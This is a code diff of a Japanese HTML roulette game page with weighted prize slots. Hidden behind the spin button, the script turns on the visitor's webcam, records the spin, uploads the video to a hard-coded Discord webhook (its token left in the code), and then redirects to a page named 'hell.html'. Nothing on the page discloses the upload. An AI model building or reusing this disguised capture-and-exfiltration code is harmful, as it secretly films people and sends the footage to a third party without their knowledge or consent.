@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>録画付きルーレット</title>
+  <title>ルーレット録画</title>
   <style>
     body {
       font-family: sans-serif;
@@ -10,6 +10,7 @@
       margin-top: 50px;
       background: #f5f5f5;
     }
+
     #pointer {
       width: 0;
       height: 0;
@@ -18,6 +19,7 @@
       border-top: 30px solid red;
       margin: 0 auto 10px;
     }
+
     #wheelCanvas {
       border-radius: 50%;
       margin: 0 auto;
@@ -25,6 +27,7 @@
       background: white;
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
+
     #spinButton {
       margin-top: 25px;
       font-size: 1.6em;
@@ -33,9 +36,14 @@
       color: white;
       border: none;
       border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
       cursor: pointer;
+      transition: 0.3s;
     }
+
+    #spinButton:hover {
+      background-color: #1976D2;
+    }
+
     #result {
       margin-top: 20px;
       font-size: 1.5em;
@@ -48,10 +56,8 @@
 
   <div id="pointer"></div>
   <canvas id="wheelCanvas" width="400" height="400"></canvas>
-
-  <button id="spinButton" onclick="startSpin()">🎲 回す！</button>
-
-  <div id="result"> </div>
+  <button id="spinButton" onclick="startSpinAndRecord()">🎲 回す！</button>
+  <div id="result"></div>
 
   <script>
     const items = [
@@ -62,10 +68,12 @@
       { label: '100ロバ', weight: 0.5 },
       { label: '1000ロバ', weight: 0.2 }
     ];
-    const colors = ['#FFD54F', '#FFB74D', '#4FC3F7', '#81C784', '#F06292', '#BA68C8', '#A1887F'];
+    const colors = ['#FFD54F', '#FFB74D', '#4FC3F7', '#81C784', '#F06292', '#BA68C8'];
+
     const canvas = document.getElementById('wheelCanvas');
     const ctx = canvas.getContext('2d');
     const resultBox = document.getElementById("result");
+
     let currentRotation = 0;
     let spinning = false;
 
@@ -94,6 +102,7 @@
         ctx.fillStyle = colors[i % colors.length];
         ctx.fill();
 
+        // テキスト
         const textAngle = (currentAngle + angle / 2) * Math.PI / 180;
         ctx.save();
         ctx.rotate(textAngle);
@@ -109,17 +118,19 @@
       ctx.restore();
     }
 
-    drawWheel();
+    function pickRandomItem() {
+      const r = Math.random() * totalWeight;
+      let sum = 0;
+      for (let i = 0; i < items.length; i++) {
+        sum += items[i].weight;
+        if (r < sum) return i;
+      }
+      return items.length - 1;
+    }
 
-    async function startSpin() {
+    function spin(callback) {
       if (spinning) return;
       spinning = true;
-
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.start();
 
       const selectedIndex = pickRandomItem();
       let angleBefore = 0;
@@ -127,7 +138,6 @@
         angleBefore += anglePerWeight * items[i].weight;
       }
       const angleTarget = angleBefore + (anglePerWeight * items[selectedIndex].weight) / 2;
-
       const targetRotation = 360 * 6 + angleTarget;
       const duration = 8000;
       const start = performance.now();
@@ -143,48 +153,55 @@
           requestAnimationFrame(animate);
         } else {
           resultBox.textContent = items[selectedIndex].label;
+          callback();
         }
       }
 
       requestAnimationFrame(animate);
+    }
 
-      setTimeout(() => {
-        mediaRecorder.stop();
-        stream.getTracks().forEach(track => track.stop());
+    // メイン処理
+    function startSpinAndRecord() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
 
-        mediaRecorder.onstop = () => {
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'video/webm' });
-          const file = new File([blob], "record.webm", { type: "video/webm" });
-
-          const formData = new FormData();
-          formData.append("file", file);
-
-          // ← あなたの Discord Webhook URL に置き換えてね
-          const webhookURL = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY";
-
-          fetch(webhookURL, {
-            method: "POST",
-            body: formData
-          }).then(() => {
-            console.log("🎥 録画送信完了！");
-            // 必要ならページ遷移もここに書ける
-            // window.location.href = "hell.html";
-          }).catch(console.error);
+          sendToDiscord(blob);
+          stream.getTracks().forEach(track => track.stop());
         };
 
-        spinning = false;
-      }, 8000);
+        recorder.start();
+        spin(() => {
+          recorder.stop(); // 回転が終わったら録画停止
+        });
+
+      }).catch(err => {
+        alert("カメラの使用が許可されていません！");
+        console.error(err);
+      });
     }
 
-    function pickRandomItem() {
-      const r = Math.random() * totalWeight;
-      let sum = 0;
-      for (let i = 0; i < items.length; i++) {
-        sum += items[i].weight;
-        if (r < sum) return i;
-      }
-      return items.length - 1;
+    function sendToDiscord(blob) {
+      const webhookUrl = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY"; // 🔁 差し替えてね
+
+      const formData = new FormData();
+      formData.append("file", blob, "roulette_record.webm");
+
+      fetch(webhookUrl, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        window.location.href = "hell.html";
+      }).catch(() => {
+        window.location.href = "hell.html"; // 失敗しても遷移
+      });
     }
+
+    drawWheel();
   </script>
+
 </body>
 </html>
